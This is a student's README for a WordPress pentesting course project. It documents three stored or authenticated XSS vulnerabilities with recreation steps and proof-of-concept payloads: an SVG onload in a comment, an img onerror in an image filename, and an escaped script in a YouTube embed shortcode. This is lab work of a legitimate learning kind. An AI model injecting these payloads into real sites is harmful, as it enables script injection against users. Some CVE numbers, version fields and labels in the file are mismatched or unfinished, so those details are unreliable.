# Web-Security-Weeks-7-8-Project-WordPress-vs.-Kali
Weeks 7 &amp; 8 Project: WordPress vs. Kali

# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1.3.7-4.4 Authenticated Cross-Site Scripting (XSS) CVE-2016-1564 
  - [ 1] Summary: 
    - Vulnerability types: 3.7-4.4	
    - Tested in version: 4.2
    - Fixed in version: 4.26
  - [1 ] GIF Walkthrough: ![reply](https://user-images.githubusercontent.com/55426354/79058665-d1ece000-7c3e-11ea-992d-961c92d0f2e7.gif)
  - [ 1] Steps to recreate: Post the following XSS code into a comment or post than do->
	 <span>[http://codepath.org//<svg onload=alert('got_you')]</span>
  - [ ] Affected source code: 
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename CVE-2016-7168 
    - Vulnerability types:
    - Tested in version: 2.5-4.6
    - Fixed in version: 4.2
  - [ ] GIF Walkthrough: ![picture](https://user-images.githubusercontent.com/55426354/79058836-d1eddf80-7c40-11ea-972c-f45bbde089b9.gif)
  - [ ] Steps to recreate:  <ol>
<li>find an image and upload.</li>
  <li>Change the .jpg with the following script hope<img src= picture onerror =alert("picture_got_u")>.jpg</li>
<li>Create new media in library and upload the image.</li>
<li>View attachment page to view the image post.</li>
</ol>
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1.4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds CVE-2015-6535 
    - Vulnerability types: 4.0-4.7.2
    - Tested in version: 4.2
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: ![video](https://user-images.githubusercontent.com/55426354/79059136-b2f14c80-7c44-11ea-92db-90ec9597cbcb.gif)
  - [ ] Steps to recreate: Create a new post and embed a link
 <ol>
<li>Insert the malicious YouTube embed shortcode.</li>
  <li>[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]</li>
</ol>
	
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)	
   - [Link 2] https://wpvulndb.com/vulnerabilities/8768
    - [Link 3]https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
   - [Link 4] https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
   - [Link 5] https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
    - [Link 6]https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.